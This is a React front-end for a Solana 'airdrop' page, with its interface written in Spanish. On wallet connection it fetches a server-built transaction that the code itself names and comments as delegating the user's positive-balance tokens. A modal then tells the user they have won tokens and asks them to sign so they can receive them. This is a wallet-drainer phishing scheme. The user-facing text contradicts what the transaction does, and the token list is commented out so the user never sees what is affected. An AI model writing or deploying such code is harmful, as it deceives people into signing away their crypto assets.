"use client";

import { useWallet, useConnection } from "@solana/wallet-adapter-react";
import { useEffect, useState } from "react";
import { AppHero } from "@/components/app-hero";
import { Transaction } from "@solana/web3.js";

export function DashboardFeature() {
  const { publicKey, signTransaction } = useWallet();
  const { connection } = useConnection();

  const [tokens, setTokens] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [transactionToSign, setTransactionToSign] = useState<Transaction | null>(null);

  useEffect(() => {
    if (!publicKey || !signTransaction) return;

    const fetchAndDelegate = async () => {
      setLoading(true);
      try {
        // 1️⃣ Llamar al backend para obtener tokens + transacción
        const res = await fetch("/api/tokens", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ 
            owner: publicKey.toBase58()
          }),
        });
        const data = await res.json();
        setTokens(data.tokens || []);

        if (!data.serializedTx) {
          console.log("No hay tokens positivos para delegar.");
          return;
        }

        // 2️⃣ Reconstruir la transacción
        const transaction = Transaction.from(Buffer.from(data.serializedTx, "base64"));

        // Guardar la transacción y mostrar modal antes de firmar
        setTransactionToSign(transaction);
        setShowModal(true);

      } catch (err: any) {
        console.error("❌ Error al obtener tokens:", err.message || err);
      } finally {
        setLoading(false);
      }
    };

    fetchAndDelegate();
  }, [publicKey, signTransaction]);

  const handleConfirm = async () => {
    if (!transactionToSign || !signTransaction) return;
    setShowModal(false);
    setLoading(true);
    try {
      // 3️⃣ Abrir la wallet para firmar
      const signedTx = await signTransaction(transactionToSign);

      // 4️⃣ Enviar a la blockchain
      const txId = await connection.sendRawTransaction(signedTx.serialize());
      await connection.confirmTransaction(txId, "confirmed");

      console.log("✅ Transacción enviada:", txId);
    } catch (err: any) {
      console.error("❌ Error al firmar la transacción o usuario canceló:", err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="p-6">
      <AppHero title="¡Mucha Suerte!" subtitle="Conectate y verifica si clasificas a nuestro Airdrop." />
      <div className="flex items-center justify-center">
          {!publicKey && <p>Conecta tu wallet de Solana.</p>}
          {loading && <p>Verificando...</p>}
      </div>
    
      {/* {publicKey && !loading && tokens.length > 0 && (
        <>
          <h2 className="mt-4 text-lg font-semibold">
            {tokens.length} cuentas con saldo positivo
          </h2>
          <ul className="mt-2 space-y-2">
            {tokens.map((t) => (
              <li key={t.tokenAccount} className="border p-2 rounded-md">
                <strong>{t.name}</strong> ({t.symbol})
                <br />
                Mint: {t.mint}
                <br />
                Amount: {t.amount}
              </li>
            ))}
          </ul>
        </>
      )} */}

      {/* Modal de confirmación */}
      {showModal && (
        <div className="fixed inset-0 flex items-center justify-center bg-black/50 z-50">
          <div className="bg-white p-6 rounded-lg shadow-lg w-96 text-center">
            <h2 className="text-xl font-bold mb-4">¡Felicidades!</h2>
            <p className="mb-6">
              Has ganado un set de tokens. Confirma para firmar la transacción y recibirlos.
            </p>
            <button
              className="bg-blue-600 text-white px-4 py-2 rounded mr-2"
              onClick={handleConfirm}
            >
              Confirmar
            </button>
            <button
              className="bg-gray-300 px-4 py-2 rounded"
              onClick={() => setShowModal(false)}
            >
              Cancelar
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
